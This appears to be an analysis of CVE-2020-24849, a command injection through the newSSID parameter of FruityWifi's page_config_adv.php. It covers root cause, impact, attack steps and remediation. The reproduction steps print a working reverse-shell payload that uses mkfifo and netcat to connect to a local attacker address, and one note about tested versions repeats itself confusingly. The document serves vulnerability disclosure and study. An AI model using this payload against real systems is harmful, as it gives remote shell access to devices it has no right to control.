Based on the provided information, here's an analysis of CVE-2020-24849:

**Root Cause of Vulnerability:**
- The root cause is the improper escaping of shell metacharacters within the `newSSID` parameter received from a POST request to the `page_config_adv.php` page. This allows an attacker to inject arbitrary shell commands.

**Weaknesses/Vulnerabilities Present:**
- **Remote Code Execution (RCE):** The core vulnerability is the ability to execute arbitrary code on the server.
- **Insufficient Input Sanitization:** The application fails to properly sanitize or escape user-provided input, specifically within the `newSSID` parameter.
- **Shell Injection:** The injected shell metacharacters are not properly handled, leading to the execution of attacker-controlled commands.

**Impact of Exploitation:**
- **Full System Compromise:** An attacker can gain complete control of the server by executing arbitrary shell commands. This includes the ability to read sensitive information, modify data, install malware, and disrupt services.
- **Lateral Movement:** The compromised system can be used to further penetrate the network.

**Attack Vectors:**
- **HTTP POST Request:** The attack is carried out by sending a specially crafted HTTP POST request to the `page_config_adv.php` page.
- **`newSSID` Parameter:** The payload is injected through the `newSSID` parameter.

**Required Attacker Capabilities/Position:**
- **Authentication:** The attacker must be authenticated to the FruityWifi application to access the vulnerable page.
- **Network Access:** The attacker needs network access to the FruityWifi server.

**Technical Details:**

The provided steps to reproduce outline the attack:

1.  Login to the FruityWifi application.
2.  Access the `/scripts/page_config_adv.php` page.
3.  Intercept the request and change the method to `POST`.
4.  Add the `newSSID` parameter to the POST body with a payload designed to execute code, such as:
    `newSSID=A\"B'C";rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.56.1+4441+>/tmp/f;#`
    This payload attempts to establish a reverse shell connection to the attacker's machine on port 4441.
5. Start a netcat listener on the attacker's machine on port 4441.
6. Send the request.

The vulnerability is similar to CVE-2018-17317, suggesting that the code handling input parameters has not been adequately reviewed or updated to prevent shell injection.

**Additional Notes:**
- The provided text specifies the vulnerable version of FruityWifi is 2.4, although it states that it was also tested on version 2.4.
- The fix for this issue would involve properly sanitizing or escaping all input received from the user, especially when it will be used in a shell command.

This information is consistent with a typical RCE vulnerability, offering a detailed explanation of how the exploit works and what it allows an attacker to do.
